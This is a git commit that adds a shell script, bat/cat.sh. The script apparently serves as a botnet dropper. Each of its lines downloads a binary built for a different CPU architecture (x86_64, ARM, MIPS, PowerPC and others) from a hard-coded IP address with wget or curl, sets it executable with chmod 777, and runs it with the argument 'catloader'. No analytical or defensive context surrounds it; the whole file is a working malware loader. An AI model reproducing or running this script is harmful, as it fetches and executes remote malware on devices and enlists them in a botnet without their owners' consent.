2051b65c349ea4b22020d50c81a513abc7232049
MrAli <mrjaghiali@gmail.com>
2026-08-31 10:33:42 +0330

    Add files via upload

---
+++ bat/cat.sh
@@ -0,0 +1,15 @@
+#!/bin/sh
+wget http://209.99.186.128/iran.x86_64 -O x86_64 || curl http://209.99.186.128/iran.x86_64 -o x86_64; chmod 777 x86_64; ./x86_64 catloader;
+wget http://209.99.186.128/iran.aarch64 -O aarch64 || curl http://209.99.186.128/iran.aarch64 -o aarch64; chmod 777 aarch64; ./aarch64catloader;
+wget http://209.99.186.128/iran.m68k -O m68k || curl http://209.99.186.128/iran.m68k -o m68k; chmod 777 m68k; ./m68k catloader;
+wget http://209.99.186.128/iran.mips -O mips || curl http://209.99.186.128/iran.mips -o mips; chmod 777 mips; ./mips catloader;
+wget http://209.99.186.128/iran.mipsel -O mipsel || curl http://209.99.186.128/iran.mipsel -o mipsel; chmod 777 mipsel; ./mipsel catloader;
+wget http://209.99.186.128/iran.powerpc -O powerpc || curl http://209.99.186.128/iran.powerpc -o powerpc; chmod 777 powerpc; ./powerpc catloader;
+wget http://209.99.186.128/iran.sparc -O sparc || curl http://209.99.186.128/iran.sparc -o sparc; chmod 777 sparc; ./sparc catloader;
+wget http://209.99.186.128/iran.sh4 -O sh4 || curl http://209.99.186.128/iran.sh4 -o sh4; chmod 777 sh4; ./sh4 catloader;
+wget http://209.99.186.128/iran.arc -O arc || curl http://209.99.186.128/iran.arc -o arc; chmod 777 arc; ./arc catloader;
+wget http://209.99.186.128/iran.i486 -O i486 || curl http://209.99.186.128/iran.i486 -o i486; chmod 777 i486; ./i486 catloader;
+wget http://209.99.186.128/iran.armv4l -O armv4l || curl http://209.99.186.128/iran.armv4l -o armv4l; chmod 777 armv4l; ./armv4l catloader;
+wget http://209.99.186.128/iran.armv5l -O armv5l || curl http://209.99.186.128/iran.armv5l -o armv5l; chmod 777 armv5l; ./armv5l catloader;
+wget http://209.99.186.128/iran.armv6l -O armv6l || curl http://209.99.186.128/iran.armv6l -o armv6l; chmod 777 armv6l; ./armv6l catloader;
+wget http://209.99.186.128/iran.armv7l -O armv7l || curl http://209.99.186.128/iran.armv7l -o armv7l; chmod 777 armv7l; ./armv7l catloader;
